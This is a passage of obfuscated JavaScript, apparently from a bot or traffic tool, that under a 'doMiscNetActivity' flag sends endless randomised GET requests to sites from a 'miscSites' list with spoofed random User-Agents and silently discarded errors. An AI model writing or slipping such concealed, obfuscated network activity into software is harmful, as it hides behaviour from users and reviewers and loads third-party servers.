  }, -0x4 * -0x450a9 + 0x6c5ad8 + -0x46aefc);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1c * -0x18b + -0x20af + -0x3b * -0x49) * getRandomInt(-0x1cd * 0xd + 0x7 * 0x21 + 0x1683, -0x1636 + -0x7b5 * -0x1 + 0xb * 0x152));
}, 0x3 * 0xb72 + -0x125c + -0xf96);